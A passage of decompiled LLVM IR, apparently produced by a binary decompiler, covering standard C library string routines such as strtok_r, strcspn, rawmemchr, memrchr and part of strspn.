dec_label_pc_170c8:                               ; preds = %entry, %dec_label_pc_170b8
  %v0_170b8 = phi i32 [ %v1_170b8, %dec_label_pc_170b8 ], [ %v0_170c0.pr, %entry ]
  %v0_170bc = phi i32 [ %v1_170bc, %dec_label_pc_170b8 ], [ %v0_170d4.pre, %entry ]
  %v1_170c8 = urem i32 %v0_170bc, 4
  %v2_170c8 = icmp eq i32 %v1_170c8, 0
  br i1 %v2_170c8, label %dec_label_pc_170d0, label %dec_label_pc_170ac

dec_label_pc_170d0:                               ; preds = %dec_label_pc_170b8, %dec_label_pc_170c8, %entry
  %v0_1714c22 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_170b8 ], [ %v0_170b8, %dec_label_pc_170c8 ]
  %v0_170d4 = phi i32 [ %v0_170d4.pre, %entry ], [ %v1_170bc, %dec_label_pc_170b8 ], [ %v0_170bc, %dec_label_pc_170c8 ]
  %v4_170d0 = mul nuw nsw i32 %v1_170a4, 256
  %v5_170d0 = or i32 %v4_170d0, %v1_170a4
  %v4_170d8 = mul i32 %v5_170d0, 65536
  %v5_170d8 = or i32 %v4_170d8, %v5_170d0
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_1714c22, 3
  br i1 %tmp, label %dec_label_pc_170e0, label %dec_label_pc_17174.preheader

dec_label_pc_170e0:                               ; preds = %dec_label_pc_170d0, %dec_label_pc_1714c.backedge
  %v0_170fc60 = phi i32 [ %v1_170fc, %dec_label_pc_1714c.backedge ], [ %v0_1714c22, %dec_label_pc_170d0 ]
  %v0_1712059 = phi i32 [ %v4_170e0, %dec_label_pc_1714c.backedge ], [ %v0_170d4, %dec_label_pc_170d0 ]
  %v1_170e0 = inttoptr i32 %v0_1712059 to i32*
  %v2_170e0 = load i32, i32* %v1_170e0, align 4
  %v4_170e0 = add i32 %v0_1712059, 4
  %v2_170e4 = xor i32 %v2_170e0, %v5_170d8
  %v2_170e8 = add i32 %v2_170e4, 2130640639
  %v1_170ec = sub i32 -1, %v2_170e4
  %v2_170f0 = xor i32 %v2_170e8, %v1_170ec
  %v2_170f4 = and i32 %v2_170f0, -2130640640
  %v2_170f8 = icmp eq i32 %v2_170f4, 0
  %v1_170fc = add i32 %v0_170fc60, -4
  br i1 %v2_170f8, label %dec_label_pc_1714c.backedge, label %dec_label_pc_17104

dec_label_pc_1714c.backedge:                      ; preds = %dec_label_pc_170e0, %dec_label_pc_1713c
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_170fc, 3
  br i1 %tmp73, label %dec_label_pc_170e0, label %dec_label_pc_17174.preheader

dec_label_pc_17104:                               ; preds = %dec_label_pc_170e0
  %v2_17104 = inttoptr i32 %v0_1712059 to i8*
  %v3_17104 = load i8, i8* %v2_17104, align 1
  %v4_17104 = zext i8 %v3_17104 to i32
  %v9_1710c = icmp eq i32 %v4_17104, %v1_170a4
  %v1_17110 = add i32 %v0_1712059, 3
  store i32 %v1_17110, i32* @ip, align 4
  br i1 %v9_1710c, label %dec_label_pc_17180, label %dec_label_pc_17118

dec_label_pc_17118:                               ; preds = %dec_label_pc_17104
  %v1_17118 = add i32 %v0_1712059, 1
  %v2_17118 = inttoptr i32 %v1_17118 to i8*
  %v3_17118 = load i8, i8* %v2_17118, align 1
  %v4_17118 = zext i8 %v3_17118 to i32
  %v9_1711c = icmp eq i32 %v4_17118, %v1_170a4
  br i1 %v9_1711c, label %bb, label %dec_label_pc_1712c

bb:                                               ; preds = %dec_label_pc_17118
  br label %dec_label_pc_17180

dec_label_pc_1712c:                               ; preds = %dec_label_pc_17118
  %v1_1712c = add i32 %v0_1712059, 2
  %v2_1712c = inttoptr i32 %v1_1712c to i8*
  %v3_1712c = load i8, i8* %v2_1712c, align 1
  %v4_1712c = zext i8 %v3_1712c to i32
  %v9_17130 = icmp eq i32 %v4_1712c, %v1_170a4
  br i1 %v9_17130, label %dec_label_pc_17180, label %dec_label_pc_1713c

dec_label_pc_1713c:                               ; preds = %dec_label_pc_1712c
  %v2_1713c = inttoptr i32 %v1_17110 to i8*
  %v3_1713c = load i8, i8* %v2_1713c, align 1
  %v4_1713c = zext i8 %v3_1713c to i32
  %v9_17140 = icmp eq i32 %v4_1713c, %v1_170a4
  br i1 %v9_17140, label %bb36, label %dec_label_pc_1714c.backedge

bb36:                                             ; preds = %dec_label_pc_1713c
  br label %dec_label_pc_17180

dec_label_pc_17174.preheader:                     ; preds = %dec_label_pc_1714c.backedge, %dec_label_pc_170d0
  %v0_17120.lcssa = phi i32 [ %v0_170d4, %dec_label_pc_170d0 ], [ %v4_170e0, %dec_label_pc_1714c.backedge ]
  %v0_170fc.lcssa = phi i32 [ %v0_1714c22, %dec_label_pc_170d0 ], [ %v1_170fc, %dec_label_pc_1714c.backedge ]
  %v2_171747 = icmp eq i32 %v0_170fc.lcssa, 0
  br i1 %v2_171747, label %dec_label_pc_1717c, label %dec_label_pc_17164

dec_label_pc_17164:                               ; preds = %dec_label_pc_17170, %dec_label_pc_17174.preheader
  %v0_17174.in = phi i32 [ %v0_17174, %dec_label_pc_17170 ], [ %v0_170fc.lcssa, %dec_label_pc_17174.preheader ]
  %v0_17170 = phi i32 [ %v1_17170, %dec_label_pc_17170 ], [ %v0_17120.lcssa, %dec_label_pc_17174.preheader ]
  %v0_17174 = add i32 %v0_17174.in, -1
  %v1_17164 = inttoptr i32 %v0_17170 to i8*
  %v2_17164 = load i8, i8* %v1_17164, align 1
  %v3_17164 = zext i8 %v2_17164 to i32
  %v9_17168 = icmp eq i32 %v3_17164, %v1_170a4
  br i1 %v9_17168, label %dec_label_pc_17180, label %dec_label_pc_17170

dec_label_pc_17170:                               ; preds = %dec_label_pc_17164
  %v1_17170 = add i32 %v0_17170, 1
  %v2_17174 = icmp eq i32 %v0_17174, 0
  br i1 %v2_17174, label %dec_label_pc_1717c, label %dec_label_pc_17164

dec_label_pc_1717c:                               ; preds = %dec_label_pc_17170, %dec_label_pc_17174.preheader
  br label %dec_label_pc_17180

dec_label_pc_17180:                               ; preds = %dec_label_pc_170ac, %dec_label_pc_1712c, %dec_label_pc_17104, %dec_label_pc_17164, %bb36, %bb, %dec_label_pc_1717c
  %v1_17184 = phi i32 [ 0, %dec_label_pc_1717c ], [ %v1_17118, %bb ], [ %v1_17110, %bb36 ], [ %v0_17170, %dec_label_pc_17164 ], [ %v1_1712c, %dec_label_pc_1712c ], [ %v0_1712059, %dec_label_pc_17104 ], [ %v0_170bc, %dec_label_pc_170ac ]
  ret i32 %v1_17184

; uselistorder directives
  uselistorder i32 %v1_170fc, { 1, 0, 2 }
  uselistorder i32 %v0_1712059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_170d0, { 1, 0 }
  uselistorder i32 %v0_1714c22, { 1, 2, 0 }
  uselistorder i32 %v0_170bc, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_170d4.pre, { 1, 0 }
  uselistorder i32 %v1_170a4, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_17180, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_1714c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_170e0, { 1, 0 }
  uselistorder label %dec_label_pc_170d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_170c8, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17190 = load i32, i32* @r4, align 4
  store i32 %v3_17190, i32* %stack_var_-16, align 4
  %v0_17194 = load i32, i32* @r0, align 4
  store i32 %v0_17194, i32* %r4.global-to-local, align 4
  %v2_17194 = icmp eq i32 %v0_17194, 0
  %v1_17198 = load i32, i32* @r2, align 4
  br i1 %v2_17194, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_17198 = inttoptr i32 %v1_17198 to i32*
  %v3_17198 = load i32, i32* %v2_17198, align 4
  store i32 %v3_17198, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1719c = phi i32 [ %v3_17198, %bb ], [ %v0_17194, %entry ]
  store i32 %v0_1719c, i32* @r0, align 4
  store i32 %v1_17198, i32* %r5.global-to-local, align 4
  %v0_171a4 = load i32, i32* @r1, align 4
  store i32 %v0_171a4, i32* %r6.global-to-local, align 4
  %v1_171a8 = inttoptr i32 %v0_1719c to i8*
  %v2_171a8 = call i32 @__GI_strspn(i8* %v1_171a8)
  %v0_171ac = load i32, i32* %r4.global-to-local, align 4
  %v2_171ac = add i32 %v0_171ac, %v2_171a8
  %v3_171ac = inttoptr i32 %v2_171ac to i8*
  %v4_171ac = load i8, i8* %v3_171ac, align 1
  %v6_171ac = zext i8 %v4_171ac to i32
  store i32 %v6_171ac, i32* %r3.global-to-local, align 4
  store i32 %v2_171ac, i32* @r4, align 4
  %v2_171b4 = icmp eq i8 %v4_171ac, 0
  br i1 %v2_171b4, label %bb8, label %dec_label_pc_171c0

bb8:                                              ; preds = %entry._crit_edge
  %v2_171b8 = load i32, i32* %r5.global-to-local, align 4
  %v3_171b8 = inttoptr i32 %v2_171b8 to i32*
  store i32 %v2_171ac, i32* %v3_171b8, align 4
  br label %dec_label_pc_171fc

dec_label_pc_171c0:                               ; preds = %entry._crit_edge
  %v0_171c0 = load i32, i32* %r6.global-to-local, align 4
  %v3_171c8 = call i32 @__GI_strpbrk(i8* %v3_171ac, i32 %v0_171c0)
  %v3_171cc = icmp eq i32 %v3_171c8, 0
  br i1 %v3_171cc, label %dec_label_pc_171d4, label %dec_label_pc_171ec

dec_label_pc_171d4:                               ; preds = %dec_label_pc_171c0
  %v0_171d8 = load i32, i32* @r4, align 4
  store i32 %v0_171d8, i32* @r0, align 4
  %v2_171dc = call i32 @rawmemchr(i32 %v0_171d8, i32 0)
  %v0_171e0 = load i32, i32* @r4, align 4
  store i32 %v0_171e0, i32* %r3.global-to-local, align 4
  %v1_171e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_171e4 = inttoptr i32 %v1_171e4 to i32*
  store i32 %v2_171dc, i32* %v2_171e4, align 4
  br label %dec_label_pc_171fc

dec_label_pc_171ec:                               ; preds = %dec_label_pc_171c0
  %v4_171c8 = inttoptr i32 %v3_171c8 to i8*
  store i8 0, i8* %v4_171c8, align 1
  %v7_171f0 = add i32 %v3_171c8, 1
  %v1_171f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_171f4 = inttoptr i32 %v1_171f4 to i32*
  store i32 %v7_171f0, i32* %v2_171f4, align 4
  %v0_171f8 = load i32, i32* @r4, align 4
  store i32 %v0_171f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_171fc

dec_label_pc_171fc:                               ; preds = %bb8, %dec_label_pc_171d4, %dec_label_pc_171ec
  %v0_171fc = load i32, i32* %r3.global-to-local, align 4
  %v2_17200 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17200, i32* @r4, align 4
  ret i32 %v0_171fc

; uselistorder directives
  uselistorder i32 %v3_171c8, { 0, 2, 1 }
  uselistorder i32 %v0_1719c, { 1, 0 }
  uselistorder i32 %v0_17194, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_171fc, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_17208 = load i32, i32* @r4, align 4
  store i32 %v3_17208, i32* %stack_var_-16, align 4
  %v6_17208 = load i32, i32* @r5, align 4
  %v9_17208 = load i32, i32* @r6, align 4
  %v0_1720c = load i32, i32* @r0, align 4
  %v0_17210 = load i32, i32* @r1, align 4
  store i32 %v0_17210, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_1722c8 = inttoptr i32 %v0_1720c to i8*
  %v2_1722c9 = load i8, i8* %v1_1722c8, align 1
  %v2_1723011 = icmp eq i8 %v2_1722c9, 0
  store i32 %v0_17210, i32* @r0, align 4
  %v1_1723812 = add i32 %v0_1720c, 1
  store i32 %v1_1723812, i32* @r4, align 4
  br i1 %v2_1723011, label %dec_label_pc_17240, label %dec_label_pc_1721c

dec_label_pc_1721c:                               ; preds = %entry, %dec_label_pc_17228
  %v3_1722c14.in = phi i8 [ %v2_1722c, %dec_label_pc_17228 ], [ %v2_1722c9, %entry ]
  %v0_1723413 = phi i32 [ %v0_17234.pre, %dec_label_pc_17228 ], [ %v0_17210, %entry ]
  %v3_1722c14 = zext i8 %v3_1722c14.in to i32
  %v2_1721c = call i32 @__GI_strchr(i32 %v0_1723413, i32 %v3_1722c14)
  %v2_17220 = icmp eq i32 %v2_1721c, 0
  %v0_17228 = load i32, i32* @r5, align 4
  br i1 %v2_17220, label %dec_label_pc_17228, label %dec_label_pc_17240

dec_label_pc_17228:                               ; preds = %dec_label_pc_1721c
  %v1_17228 = add i32 %v0_17228, 1
  %v0_1722c.pre = load i32, i32* @r4, align 4
  %v0_17234.pre = load i32, i32* @r6, align 4
  store i32 %v1_17228, i32* @r5, align 4
  %v1_1722c = inttoptr i32 %v0_1722c.pre to i8*
  %v2_1722c = load i8, i8* %v1_1722c, align 1
  %v2_17230 = icmp eq i8 %v2_1722c, 0
  store i32 %v0_17234.pre, i32* @r0, align 4
  %v1_17238 = add i32 %v0_1722c.pre, 1
  store i32 %v1_17238, i32* @r4, align 4
  br i1 %v2_17230, label %dec_label_pc_17240, label %dec_label_pc_1721c

dec_label_pc_17240:                               ; preds = %dec_label_pc_17228, %dec_label_pc_1721c, %entry
  %v0_17240 = phi i32 [ 0, %entry ], [ %v0_17228, %dec_label_pc_1721c ], [ %v1_17228, %dec_label_pc_17228 ]
  %v2_17244 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17244, i32* @r4, align 4
  store i32 %v6_17208, i32* @r5, align 4
  store i32 %v9_17208, i32* @r6, align 4
  ret i32 %v0_17240

; uselistorder directives
  uselistorder i8 %v2_1722c, { 1, 0 }
  uselistorder i32 %v0_17234.pre, { 1, 0 }
  uselistorder i32 %v0_1722c.pre, { 1, 0 }
  uselistorder label %dec_label_pc_1721c, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_17250 = urem i32 %arg1, 256
  %v0_172682 = load i32, i32* @r0, align 4
  %v1_172683 = urem i32 %v0_172682, 4
  %v2_172684 = icmp eq i32 %v1_172683, 0
  br i1 %v2_172684, label %dec_label_pc_17270, label %dec_label_pc_17258

dec_label_pc_17258:                               ; preds = %entry, %dec_label_pc_17264
  %v0_17264 = phi i32 [ %v1_17264, %dec_label_pc_17264 ], [ %v0_172682, %entry ]
  %v1_17258 = inttoptr i32 %v0_17264 to i8*
  %v2_17258 = load i8, i8* %v1_17258, align 1
  %v3_17258 = zext i8 %v2_17258 to i32
  %v9_1725c = icmp eq i32 %v3_17258, %v1_17250
  br i1 %v9_1725c, label %dec_label_pc_172ec, label %dec_label_pc_17264

dec_label_pc_17264:                               ; preds = %dec_label_pc_17258
  %v1_17264 = add i32 %v0_17264, 1
  %v1_17268 = urem i32 %v1_17264, 4
  %v2_17268 = icmp eq i32 %v1_17268, 0
  br i1 %v2_17268, label %dec_label_pc_17270, label %dec_label_pc_17258

dec_label_pc_17270:                               ; preds = %dec_label_pc_17264, %entry
  %v0_17274 = phi i32 [ %v0_172682, %entry ], [ %v1_17264, %dec_label_pc_17264 ]
  %v4_17270 = mul nuw nsw i32 %v1_17250, 256
  %v5_17270 = or i32 %v4_17270, %v1_17250
  %v4_17278 = mul i32 %v5_17270, 65536
  %v5_17278 = or i32 %v4_17278, %v5_17270
  br label %dec_label_pc_1727c

dec_label_pc_1727c:                               ; preds = %dec_label_pc_172dc, %dec_label_pc_1727c, %dec_label_pc_17270
  %v0_172c0 = phi i32 [ %v0_17274, %dec_label_pc_17270 ], [ %v4_1727c, %dec_label_pc_1727c ], [ %v4_1727c, %dec_label_pc_172dc ]
  %v1_1727c = inttoptr i32 %v0_172c0 to i32*
  %v2_1727c = load i32, i32* %v1_1727c, align 4
  %v4_1727c = add i32 %v0_172c0, 4
  %v2_17284 = xor i32 %v2_1727c, %v5_17278
  %v2_17288 = add i32 %v2_17284, 2130640639
  %v1_17290 = sub i32 -1, %v2_17284
  %v2_17294 = xor i32 %v2_17288, %v1_17290
  %v2_17298 = and i32 %v2_17294, -2130640640
  %v2_1729c = icmp eq i32 %v2_17298, 0
  br i1 %v2_1729c, label %dec_label_pc_1727c, label %dec_label_pc_172a4

dec_label_pc_172a4:                               ; preds = %dec_label_pc_1727c
  %v2_172a4 = inttoptr i32 %v0_172c0 to i8*
  %v3_172a4 = load i8, i8* %v2_172a4, align 1
  %v4_172a4 = zext i8 %v3_172a4 to i32
  %v9_172ac = icmp eq i32 %v4_172a4, %v1_17250
  %v1_172b0 = add i32 %v0_172c0, 3
  br i1 %v9_172ac, label %dec_label_pc_172ec, label %dec_label_pc_172b8

dec_label_pc_172b8:                               ; preds = %dec_label_pc_172a4
  %v1_172b8 = add i32 %v0_172c0, 1
  %v2_172b8 = inttoptr i32 %v1_172b8 to i8*
  %v3_172b8 = load i8, i8* %v2_172b8, align 1
  %v4_172b8 = zext i8 %v3_172b8 to i32
  %v9_172bc = icmp eq i32 %v4_172b8, %v1_17250
  br i1 %v9_172bc, label %bb, label %dec_label_pc_172cc

bb:                                               ; preds = %dec_label_pc_172b8
  br label %dec_label_pc_172ec

dec_label_pc_172cc:                               ; preds = %dec_label_pc_172b8
  %v1_172cc = add i32 %v0_172c0, 2
  %v2_172cc = inttoptr i32 %v1_172cc to i8*
  %v3_172cc = load i8, i8* %v2_172cc, align 1
  %v4_172cc = zext i8 %v3_172cc to i32
  %v9_172d0 = icmp eq i32 %v4_172cc, %v1_17250
  br i1 %v9_172d0, label %dec_label_pc_172ec, label %dec_label_pc_172dc

dec_label_pc_172dc:                               ; preds = %dec_label_pc_172cc
  %v2_172dc = inttoptr i32 %v1_172b0 to i8*
  %v3_172dc = load i8, i8* %v2_172dc, align 1
  %v4_172dc = zext i8 %v3_172dc to i32
  %v9_172e0 = icmp eq i32 %v4_172dc, %v1_17250
  br i1 %v9_172e0, label %dec_label_pc_172e8, label %dec_label_pc_1727c

dec_label_pc_172e8:                               ; preds = %dec_label_pc_172dc
  br label %dec_label_pc_172ec

dec_label_pc_172ec:                               ; preds = %dec_label_pc_17258, %dec_label_pc_172cc, %dec_label_pc_172a4, %bb, %dec_label_pc_172e8
  %v1_172f0 = phi i32 [ %v1_172b0, %dec_label_pc_172e8 ], [ %v1_172b8, %bb ], [ %v1_172cc, %dec_label_pc_172cc ], [ %v0_172c0, %dec_label_pc_172a4 ], [ %v0_17264, %dec_label_pc_17258 ]
  ret i32 %v1_172f0

; uselistorder directives
  uselistorder i32 %v4_1727c, { 1, 0 }
  uselistorder i32 %v0_172c0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_17270, { 1, 0 }
  uselistorder i32 %v1_17264, { 1, 0, 2 }
  uselistorder i32 %v0_172682, { 2, 1, 0 }
  uselistorder i32 %v1_17250, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_172ec, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_17258, { 1, 0 }
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_17300 = urem i32 %arg2, 256
  %v2_17304 = add i32 %arg3, %arg1
  %v2_1731c4 = icmp eq i32 %arg3, 0
  br i1 %v2_1731c4, label %dec_label_pc_1732c, label %dec_label_pc_17324

dec_label_pc_1730c:                               ; preds = %dec_label_pc_17324
  %v1_1730c = add i32 %v0_1730c, -1
  %v2_1730c = inttoptr i32 %v1_1730c to i8*
  %v3_1730c = load i8, i8* %v2_1730c, align 1
  %v4_1730c = zext i8 %v3_1730c to i32
  %v9_17310 = icmp eq i32 %v4_1730c, %v1_17300
  br i1 %v9_17310, label %dec_label_pc_173cc, label %dec_label_pc_17318

dec_label_pc_17318:                               ; preds = %dec_label_pc_1730c
  %v1_17318 = add i32 %v0_17318, -1
  %v2_1731c = icmp eq i32 %v1_17318, 0
  br i1 %v2_1731c, label %dec_label_pc_1732c, label %dec_label_pc_17324

dec_label_pc_17324:                               ; preds = %entry, %dec_label_pc_17318
  %v0_17318 = phi i32 [ %v1_17318, %dec_label_pc_17318 ], [ %arg3, %entry ]
  %v0_1730c = phi i32 [ %v1_1730c, %dec_label_pc_17318 ], [ %v2_17304, %entry ]
  %v1_17324 = urem i32 %v0_1730c, 4
  %v2_17324 = icmp eq i32 %v1_17324, 0
  br i1 %v2_17324, label %dec_label_pc_1732c, label %dec_label_pc_1730c

dec_label_pc_1732c:                               ; preds = %dec_label_pc_17318, %dec_label_pc_17324, %entry
  %v0_173b413 = phi i32 [ %v2_17304, %entry ], [ %v1_1730c, %dec_label_pc_17318 ], [ %v0_1730c, %dec_label_pc_17324 ]
  %v0_173a09 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_17318 ], [ %v0_17318, %dec_label_pc_17324 ]
  %v4_1732c = mul nuw nsw i32 %v1_17300, 256
  %v5_1732c = or i32 %v4_1732c, %v1_17300
  %v4_17330 = mul i32 %v5_1732c, 65536
  %v5_17330 = or i32 %v4_17330, %v5_1732c
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_173a09, 3
  br i1 %tmp, label %dec_label_pc_17338, label %dec_label_pc_173c0

dec_label_pc_17338:                               ; preds = %dec_label_pc_1732c, %dec_label_pc_173a0.backedge
  %v0_1735440 = phi i32 [ %v1_17354, %dec_label_pc_173a0.backedge ], [ %v0_173a09, %dec_label_pc_1732c ]
  %v0_1733839 = phi i32 [ %v1_17338, %dec_label_pc_173a0.backedge ], [ %v0_173b413, %dec_label_pc_1732c ]
  %v1_17338 = add i32 %v0_1733839, -4
  %v2_17338 = inttoptr i32 %v1_17338 to i32*
  %v3_17338 = load i32, i32* %v2_17338, align 4
  %v2_1733c = xor i32 %v3_17338, %v5_17330
  %v2_17340 = add i32 %v2_1733c, 2130640639
  store i32 %v2_17340, i32* @ip, align 4
  %v1_17344 = sub i32 -1, %v2_1733c
  %v2_17348 = xor i32 %v2_17340, %v1_17344
  %v2_1734c = and i32 %v2_17348, -2130640640
  %v2_17350 = icmp eq i32 %v2_1734c, 0
  %v1_17354 = add i32 %v0_1735440, -4
  br i1 %v2_17350, label %dec_label_pc_173a0.backedge, label %dec_label_pc_1735c

dec_label_pc_173a0.backedge:                      ; preds = %dec_label_pc_17338, %dec_label_pc_17394
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_17354, 3
  br i1 %tmp46, label %dec_label_pc_17338, label %dec_label_pc_173c0

dec_label_pc_1735c:                               ; preds = %dec_label_pc_17338
  %v1_1735c = add i32 %v0_1733839, -1
  %v2_1735c = inttoptr i32 %v1_1735c to i8*
  %v3_1735c = load i8, i8* %v2_1735c, align 1
  %v4_1735c = zext i8 %v3_1735c to i32
  %v9_17360 = icmp eq i32 %v4_1735c, %v1_17300
  br i1 %v9_17360, label %dec_label_pc_1738c, label %dec_label_pc_1736c

dec_label_pc_1736c:                               ; preds = %dec_label_pc_1735c
  %v1_1736c = add i32 %v0_1733839, -2
  %v2_1736c = inttoptr i32 %v1_1736c to i8*
  %v3_1736c = load i8, i8* %v2_1736c, align 1
  %v4_1736c = zext i8 %v3_1736c to i32
  %v9_17370 = icmp eq i32 %v4_1736c, %v1_17300
  br i1 %v9_17370, label %dec_label_pc_1738c, label %dec_label_pc_1737c

dec_label_pc_1737c:                               ; preds = %dec_label_pc_1736c
  %v1_1737c = add i32 %v0_1733839, -3
  %v2_1737c = inttoptr i32 %v1_1737c to i8*
  %v3_1737c = load i8, i8* %v2_1737c, align 1
  %v4_1737c = zext i8 %v3_1737c to i32
  %v9_17380 = icmp eq i32 %v4_1737c, %v1_17300
  br i1 %v9_17380, label %dec_label_pc_1738c, label %dec_label_pc_17394

dec_label_pc_1738c:                               ; preds = %dec_label_pc_1737c, %dec_label_pc_1736c, %dec_label_pc_1735c
  %v0_1738c = phi i32 [ %v1_1737c, %dec_label_pc_1737c ], [ %v1_1736c, %dec_label_pc_1736c ], [ %v1_1735c, %dec_label_pc_1735c ]
  br label %dec_label_pc_173cc

dec_label_pc_17394:                               ; preds = %dec_label_pc_1737c
  %v1_17394 = inttoptr i32 %v1_17338 to i8*
  %v2_17394 = load i8, i8* %v1_17394, align 1
  %v3_17394 = zext i8 %v2_17394 to i32
  %v9_17398 = icmp eq i32 %v3_17394, %v1_17300
  br i1 %v9_17398, label %dec_label_pc_173cc, label %dec_label_pc_173a0.backedge

dec_label_pc_173b4:                               ; preds = %dec_label_pc_173c0
  %v1_173c0 = add i32 %v0_173c0, -1
  %v1_173b4 = add i32 %v0_173b4, -1
  %v2_173b4 = inttoptr i32 %v1_173b4 to i8*
  %v3_173b4 = load i8, i8* %v2_173b4, align 1
  %v4_173b4 = zext i8 %v3_173b4 to i32
  %v9_173b8 = icmp eq i32 %v4_173b4, %v1_17300
  br i1 %v9_173b8, label %dec_label_pc_173cc, label %dec_label_pc_173c0

dec_label_pc_173c0:                               ; preds = %dec_label_pc_1732c, %dec_label_pc_173a0.backedge, %dec_label_pc_173b4
  %v0_173b4 = phi i32 [ %v1_173b4, %dec_label_pc_173b4 ], [ %v0_173b413, %dec_label_pc_1732c ], [ %v1_17338, %dec_label_pc_173a0.backedge ]
  %v0_173c0 = phi i32 [ %v1_173c0, %dec_label_pc_173b4 ], [ %v0_173a09, %dec_label_pc_1732c ], [ %v1_17354, %dec_label_pc_173a0.backedge ]
  %v2_173c0 = icmp eq i32 %v0_173c0, 0
  br i1 %v2_173c0, label %dec_label_pc_173c8, label %dec_label_pc_173b4

dec_label_pc_173c8:                               ; preds = %dec_label_pc_173c0
  br label %dec_label_pc_173cc

dec_label_pc_173cc:                               ; preds = %dec_label_pc_1730c, %dec_label_pc_17394, %dec_label_pc_173b4, %dec_label_pc_1738c, %dec_label_pc_173c8
  %v1_173d0 = phi i32 [ %v0_1738c, %dec_label_pc_1738c ], [ 0, %dec_label_pc_173c8 ], [ %v1_173b4, %dec_label_pc_173b4 ], [ %v1_17338, %dec_label_pc_17394 ], [ %v1_1730c, %dec_label_pc_1730c ]
  ret i32 %v1_173d0

; uselistorder directives
  uselistorder i32 %v0_173c0, { 1, 0 }
  uselistorder i32 %v1_17354, { 1, 0, 2 }
  uselistorder i32 %v1_17338, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_1733839, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1732c, { 1, 0 }
  uselistorder i32 %v0_173a09, { 1, 2, 0 }
  uselistorder i32 %v0_1730c, { 1, 0, 2 }
  uselistorder i32 %v2_17304, { 1, 0 }
  uselistorder i32 %v1_17300, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_173cc, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_173c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_173a0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_17338, { 1, 0 }
  uselistorder label %dec_label_pc_1732c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17324, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1740c2 = load i32, i32* @r0, align 4
  %v1_1740c3 = inttoptr i32 %v0_1740c2 to i8*
  %v2_1740c4 = load i8, i8* %v1_1740c3, align 1
  %v3_1740c5 = zext i8 %v2_1740c4 to i32
  store i32 %v3_1740c5, i32* @ip, align 4
  %v2_174106 = icmp eq i8 %v2_1740c4, 0
  br i1 %v2_174106, label %dec_label_pc_1741c, label %dec_label_pc_173f0.preheader

dec_label_pc_173e8:                               ; preds = %dec_label_pc_173f0
  %v3_173f0 = zext i8 %v2_173f0 to i32
  %v1_173f8 = add i32 %v0_173f8, 1
  %v9_173e8 = icmp eq i32 %v0_173e810, %v3_173f0
  br i1 %v9_173e8, label %dec_label_pc_17404, label %dec_label_pc_173f0

dec_label_pc_173f0:                               ; preds = %dec_label_pc_173f0.preheader, %dec_label_pc_173e8
  %v0_173f8 = phi i32 [ %tmp, %dec_label_pc_173f0.preheader ], [ %v1_173f8, %dec_label_pc_173e8 ]
  %v1_173f0 = inttoptr i32 %v0_173f8 to i8*
  %v2_173f0 = load i8, i8* %v1_173f0, align 1
  %v2_173f4 = icmp eq i8 %v2_173f0, 0
  br i1 %v2_173f4, label %dec_label_pc_1741c, label %dec_label_pc_173e8

dec_label_pc_17404:                               ; preds = %dec_label_pc_173e8
  %v1_17404 = add i32 %v0_17404, 1
  %v1_17408 = add i32 %v0_17408, 1
  %v1_1740c = inttoptr i32 %v1_17408 to i8*
  %v2_1740c = load i8, i8* %v1_1740c, align 1
  %v3_1740c = zext i8 %v2_1740c to i32
  store i32 %v3_1740c, i32* @ip, align 4
  %v2_17410 = icmp eq i8 %v2_1740c, 0
  br i1 %v2_17410, label %dec_label_pc_1741c, label %dec_label_pc_173f0.preheader

dec_label_pc_173f0.preheader:                     ; preds = %entry, %dec_label_pc_17404
  %v0_17408 = phi i32 [ %v1_17408, %dec_label_pc_17404 ], [ %v0_1740c2, %entry ]
